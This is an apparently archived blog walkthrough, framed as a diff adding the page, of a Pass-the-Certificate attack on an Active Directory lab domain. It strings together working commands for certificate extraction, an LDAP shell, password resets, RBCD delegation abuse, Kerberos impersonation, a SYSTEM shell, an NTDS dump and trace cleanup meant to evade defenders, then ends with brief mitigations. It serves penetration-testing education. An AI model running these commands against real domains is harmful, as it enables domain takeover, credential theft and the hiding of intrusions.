@@ -1,0 +1,123 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">A Detailed Guide on PassTheCert</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-passthecert/" rel="bookmark"><time class="entry-date published" datetime="2025-07-28T14:44:53+00:00">July 28, 2025</time><time class="updated" datetime="2025-07-28T14:51:59+00:00">July 28, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Pass-the-Certificate is a highly effective Kerberos privilege escalation method that bypasses traditional password-based authentication. Instead of relying on passwords or hashes, it uses X.509 certificates and private keys to exploit the PKINIT (Public Key Cryptography for Initial Authentication) extension. This allows attackers to obtain a Ticket-Granting Ticket (TGT), granting them unauthorized access to network resources.</span></p>
+<p><span style="color: #000000;">By leveraging the security vulnerabilities in Kerberos authentication, Pass-the-Certificate is a serious threat to organizations relying on this protocol. Understanding how Pass-the-Certificate works and implementing countermeasures is essential for safeguarding Kerberos-based systems against sophisticated attacks.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Overview the Pass-The-certificate (PtC)</strong></span></li>
+<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Enumeration &amp; Exploitation </strong></span></li>
+<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Overview the Pass-The-certificate (PtC)</span></h3>
+<p><span style="color: #000000;">In traditional Active Directory exploitation, <strong>Pass-the-Hash</strong> and <strong>Pass-the-Ticket</strong> attacks are widely known. <strong>Pass-the-Certificate</strong> is a more modern and stealthy technique that leverages <strong>X.509 certificates</strong> instead of NTLM hashes or Kerberos tickets to authenticate and escalate privileges across an AD environment.</span></p>
+<h4><span style="color: #800000;">What is Pass-the-Certificate?</span></h4>
+<p><span style="color: #000000;">Pass-the-Certificate (PtC) is a post-exploitation technique where an attacker uses a <strong>certificate and its corresponding private key</strong> to authenticate to Active Directory services, all <strong>without knowing or needing the user’s password</strong>. It is possible due to:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>PKINIT (Public Key Cryptography for Initial Authentication in Kerberos)</strong> – allows Kerberos to use certificates instead of passwords.</span></li>
+<li><span style="color: #000000;"><strong>Schannel (Secure Channel)</strong> – permits certificate-based authentication over LDAP, SMB, and other services.</span></li>
+</ul>
+<p><span style="color: #000000;">If an attacker can extract or generate a certificate associated with a privileged user (like Administrator), they can <strong>impersonate that user indefinitely</strong> as long as the cert is valid.</span></p>
+<h4><span style="color: #800000;">Why Is This Dangerous?</span></h4>
+<ul>
+<li><span style="color: #000000;"><strong>Bypasses Password Policies</strong> – MFA, lockout thresholds, and password changes don’t help.</span></li>
+<li><span style="color: #000000;"><strong>Long-Lived Access</strong> – Certs typically have longer validity (months to years).</span></li>
+<li><span style="color: #000000;"><strong>Stealthy</strong> – May not trigger alerts if PKINIT and Schannel usage aren’t monitored.</span></li>
+<li><span style="color: #000000;"><strong>RBCD Abuse</strong> – In combination with Resource-Based Constrained Delegation (RBCD), it can lead to full domain compromise.</span></li>
+</ul>
+<h3><span style="color: #800000;">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000;">Tools: Certipy, passthecert.py (Python version), nxc smb, impacket-getST, impacket-psexec.</span></li>
+</ul>
+<p><span style="color: #000000;">In this walkthrough, we assume: A privileged certificate (administrator.pfx) is already available (e.g., obtained in previous AD CS attack chains).</span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration &amp; Exploitation</span> </span></h3>
+<p><span style="color: #000000;">We’ll start with a valid .pfx file for a high-privileged user (Administrator), extract the certificate and private key, then use tools like passthecert.py, impacket-getST, and psexec to pivot, elevate, and ultimately achieve full domain dominance.</span></p>
+<h4><span style="color: #800000;">Extract Certificate and Private Key</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad cert -pfx administrator.pfx -nokey -out admin.crt 
+certipy-ad cert -pfx administrator.pfx -nocert -out admin.key</pre>
+<p><span style="color: #000000;">We separate the PFX into a certificate (admin.crt) and private key (admin.key) for passthecert.py, as the private key is essential for authentication. This ensures compatibility with TLS or LDAP-based authentication systems.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhvdr7f5waNJXl3_vYL6_oaWGuhT2-O66oiY0_Omqo1Gb0etPCoY5qo_w3HoiXQPadDh1YdBVZSXVRD18wDlhkzuFyvxwGQxwTsqqDlGBKHeWqXViqSRu8oxs3dSX_020BBF5HGU-JvljCleiKwvAH6e99hogfHdjhoxRzvLenAn2AyS0eTedDiPDWx_zi/s16000/1.png"/></strong></span></p>
+<h4><span style="color: #800000;">Launch an LDAP Shell as Administrator</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000;">After separating the PFX into a certificate and private key, this method uses those to establish an interactive LDAP shell authenticated as Administrator via TLS Schannel, bypassing Kerberos. It’s useful when PKINIT fails, allowing direct administrative control via LDAP.</span></p>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhy9xJvsJolUSUOGEEPulY-sPate5uqXRh1YbZIRjfxJe7hgJrZrBNSiT2ldcej8nG2m5nEfugzGsTEvRUdhsWJbU01uw210KpRop6lXVo41_iVQBQbe6YL-mQBwaGVETq1VTl1-MCa1itnJeUnHl_NZhZwZjYnHW7UeD8bqLHfgbBZbwjQC_XJ5DRF2MIz/s16000/2.png" alt="PassTheCert Attack " width="1466" height="251"/></span></p>
+<h4><span style="color: #800000;">Reset a User’s Password via Certificate</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -target sanjeet -new-pass Password@3</pre>
+<p><span style="color: #000000;">This step modifies the target user (sanjeet) to set a new password (Password@3), impersonating Administrator. It allows us to pivot by gaining control over another account’s credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgizuT1PSO4f2QC86IlYvT2Oa5TDjPlQvU5I5XSaU98k_TBR2vVWQmhQVgn7GVgk4mjT4ACMj6ydrZ4uofZIWAjji5NsZGAbDmPaO1aD9osLjkeZiOOCthGes0wFePYVenmfbbib3vtJ8aPxSufDD2CKOcUuQF_aebxXT6PPlplKsX8nxY_9ovMj9n3sLKH/s16000/3.png"/></span></p>
+<h4><span style="color: #800000;">Elevate raj via Cert-Auth</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -target raj -elevate</pre>
+<p><span style="color: #000000;">The command used to elevate the privileges of <strong>raj</strong> by modifying their account, using the certificate (admin.crt) and private key (admin.key) for authentication.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrm_ggBF2I6DjHcT83zYGffaiOE2aJzhMGT1CVtq6-F6YFj-ylEO2Jb4a-SgsFTFU9IjzJd4C7pmBm7N74eiUB7QXog1SPn3VP2pB4Vwwn0mGDyc6zzrMSVxRQvaNUl14Q28Zf1D-kY27qzdophszsnA-DBzYgGIYJz5xriH1GgYZEIIr6CMI2i3Ockyvg/s16000/5.png" alt="PassTheCert Attack " width="1175" height="167"/></span></p>
+<h4><span style="color: #800000;">Validate Elevated Privilege Access</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.20 -u raj -p 'Password@1' –ntds</pre>
+<p><span style="color: #000000;">This step attempts the NTDS dump again using <strong>raj</strong>, now with upgraded privileges. It highlights that the certificate-based elevation effectively provided real-world control, enabling us to execute the dump with escalated permissions.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhy2SPdY2FHGxMmoZebLKj4772dPtjk3HLoK5F3fs66hCNLBAGA3VI1B0ZYZ-UkcHBM3MvdfiJmOTI8QANn9qpCSfKCiLLfVI4PrW5idk8ahY3AeB8Q9b7jaTt6On7kzpoXOQhY5uPjwcpz9ODa9zIdyBJKQ7bHJjnfFE78TWoWwqBMtLKI2cJ1jWp6GIPK/s16000/6.png"/></span></p>
+<h4><span style="color: #800000;">Add a New Computer Account (HULK)</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action add_computer -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -computer-name HULK -computer-pass Password@2</pre>
+<p><span style="color: #000000;">This step creates a computer object <strong>HULK$</strong> in the domain, setting up a machine account for <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/"><strong>Resource-Based Constrained Delegation (RBCD)</strong></a></span> chaining. This establishes the foundation for further escalation through RBCD, which will be configured in the next step from <strong>HULK</strong> to <strong>DC01$</strong>, enabling us to delegate privileges and move laterally across the network.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtyteK6HnyTZfwSg_N8rx6NPkfkcwrOjGjpblFMvUaKSykXVzpRBjl9tdIrmMooZPNZnmiT40OtBqUy9O0hgj9uSi-a5G3JU6glqFhD4bKplft4t0EJf4ol4FV54TmZycf2PFNRTJh-q4ev3SivmHolnPxbUx1LJ2pW1RHXTJxvxgEM3Ng6mDkuL9nIxX3/s16000/7.png" alt="PassTheCert Attack " width="1193" height="159"/></span></p>
+<h4><span style="color: #800000;">Configure RBCD (Delegation) from HULK to DC01$</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action write_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to DC01$ -delegate-from HULK$</pre>
+<p><span style="color: #000000;">This step adds <strong>ACES</strong> in <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>, granting <strong>HULK$</strong> the ability to impersonate <strong>DC01$</strong>. This action enables us to perform actions on behalf of the DC01 machine, leveraging the RBCD configuration to escalate privileges and gain further access within the domain.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhth_PHrHxwJAB2k_JfvdFmLOlyhJIQzx4BG8Dc1H7Y2grSb0HAWdaLe-p6RLAs3wCTRUSiTdubu56ZyuEnfNCfFKdUlt8Z0heRr3kNP39vikiC9kTqqwrZNDCx5p0qOXEXLMKNEMd1fuYmz2aIEDF6JuZrMcGIppC24LOYdRLD-UKa_WsrG1GNfEvp0qxK/s16000/8.png"/></span></p>
+<h4><span style="color: #800000;">Impersonate via kerberos using GetST</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-getST ignite.local/'HULK$':Password@3 -spn cifs/DC01.ignite.local -impersonate administrator -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000;">This step requests a <strong>CIFS Service Ticket (TGS)</strong> for <strong>DC01$</strong>, impersonating <strong>Administrator</strong>. By using the RBCD chain (HULK$ → DC01$), it instructs Active Directory to issue a fully delegated Kerberos ticket for Administrator access, setting up the next step to execute <strong>psexec</strong> with elevated privileges.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqA77Em334TwUjUl1fG_pluqTDpJaU_Pff9qGV5cbVItallk0dAE3K4NGGxbNxHCOX9ZDvEzzhbYlkHtILZoWQvAume0w3JTRKyotF8B8Xg-HN5tMEToW4eDjqCC2JHfVFUUitYTALEJxXkhGDAb2zvR_9Eu1IEU7o9g6LM_Uok07ew4QuLOE8tRuFdcJ4/s16000/9.png" alt="PassTheCert Attack " width="1106" height="276"/></span></p>
+<h4><span style="color: #800000;">Load Ticket and Achieve SYSTEM Shell</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">KRB5CCNAME=administrator@cifs_DC01.ignite.local@IGNITE.LOCAL.ccache 
+impacket-psexec ignite.local/administrator@Dc01.ignite.local -k -no-pass -dc-ip 192.168.1.20</pre>
+<p><span style="color: #000000;">This step loads the cached Service Ticket (TGS) into the Kerberos cache. Then, using PsExec, we authenticate as Administrator without a password. By leveraging the TGS from impacket-getST, we impersonate Administrator, thus completing the escalation chain that began with admin.crt and admin.key along with RBCD.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1ImtVYsaM3NjtnVIN_Eoga-1FX7iUKtJDpi99UDmps0PhMbNxhkpaYa2iGzkoe8YnFXHCHGXGRXdpKq19sIZSC-YXyZVUw-ro_wgsm_4KiROIjUAisd_C_jO4RuLC8GGkrIPsRV7HZWTT31qUEyvmdnR0q0uqfS_0EC_h294c6YUbv9B1a0YGW_ZYKtY5/s16000/10.png"/></span></p>
+<h4><span style="color: #800000;">Read RBCD Entries (Verify Delegation Config)</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action read_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to DC01$</pre>
+<p><span style="color: #000000;">This checks the <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute on <strong>DC01$</strong>, confirming active RBCD configuration and identifying accounts (e.g., <strong>HULK$</strong>) that can impersonate users like <strong>Administrator</strong> before performing cleanup or persistence actions.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVoUPvxSknK4exdBY6h7ZMd-lKM-xXI0CCnJRlpvfraxsU7e8RCbcMiyZ_HTwiVltNQBWHnxlwXB9ZQagIFib8PfI5mzT6NEe0U36FQVarTqHM7LqVkw8WdzdFFCFa77Y2oLQ4el1XA8nvuv7Zu0o7IBve25UCI8wYtIlTGMO09yyXKiyINThfNyd-U7nw/s16000/11.png" alt="PassTheCert Attack " width="1154" height="178"/></span></p>
+<h4><span style="color: #800000;">Flush RBCD Delegation for a Target Object</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action flush_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to raj</pre>
+<p><span style="color: #000000;">This command removes the RBCD configuration for <strong>raj</strong>, clearing the delegation ACL to erase traces of impersonation and hinder detection by blue teams.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdWAFKeFlDJmgpMRTE3VsENA7gJEjdt5L6rPXmLye5MZBY5rnjVvbfEs-NM50SVE6yFwj0sEJ-yG4l3gZ4zOStKqf8qkHrIDJa9qdvwXGvImPmeo17jUoTGdGiXlpXX2K-g98wxZdK2fC18Z9lH3_EM2PNOKtWNB5Z4Vqy59XYOpBhRpgsT85t-ViEY7D9/s16000/12.png"/></span></p>
+<h4><span style="color: #800000;">Re-Verify RBCD Was Flushed</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 passthecert.py -action read_rbcd -crt admin.crt -key admin.key -domain ignite.local -dc-ip 192.168.1.20 -delegate-to DC01$</pre>
+<p><span style="color: #000000;">This re-runs the first query to verify the delegation rights are removed, and if no entries are found, it confirms that <strong>flush_rbcd</strong> succeeded, ensuring proper verification for both red and blue teams.</span></p>
+<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir8cRARoYsVGdaZycoTRW2hAblAre8Q_w0gYESE_HkIBDUlLsnPRib-yi7rYEnH-47kO5oo8WobQLBQhkbbY3V-ciTh1Tzck04vqCzJjpDcB-XhtxZEQqJkeADPtvcXfqEAddXjaZhVdRmWP7W_plTTshnN2xVBKRg8pRI9MWQhGwEOsdagwSnM0rzOvM0/s16000/13.png" alt="PassTheCert Attack " width="1162" height="165"/></strong></span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;">Limit certificate issuance to trusted roles only</span></li>
+<li><span style="color: #000000;">Monitor for unusual certificate usage and Schannel binds</span></li>
+<li><span style="color: #000000;">Detect unexpected <strong>User &gt; Computer delegation entries</strong> (msDS-AllowedToActOnBehalfOfOtherIdentity)</span></li>
+<li><span style="color: #000000;">Audit password modifications via certificate-auth shell</span></li>
+<li><span style="color: #000000;">Disable unmanaged or unused RBCD ACLs</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author: </strong>MD Aslam drives security excellence and mentors teams to strengthen security across products, networks, and organizations as a dynamic Information Security leader. Contact<strong> <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></span></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/a-detailed-guide-on-certipy/" title="A Detailed Guide on Certipy">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Certipy</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/crunch-wordlist-generation-guide/" title="A Detailed Guide on Crunch">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Crunch</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/aws-iam-attachuserpolicy-abuse/" rel="prev">AWS: IAM AttachUserPolicy Abuse</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/evil-novnc-a-realistic-phishing-simulation/" rel="next">Evil-noVNC: A Realistic Phishing Simulation</a></div></div>
+	</nav>        </div>
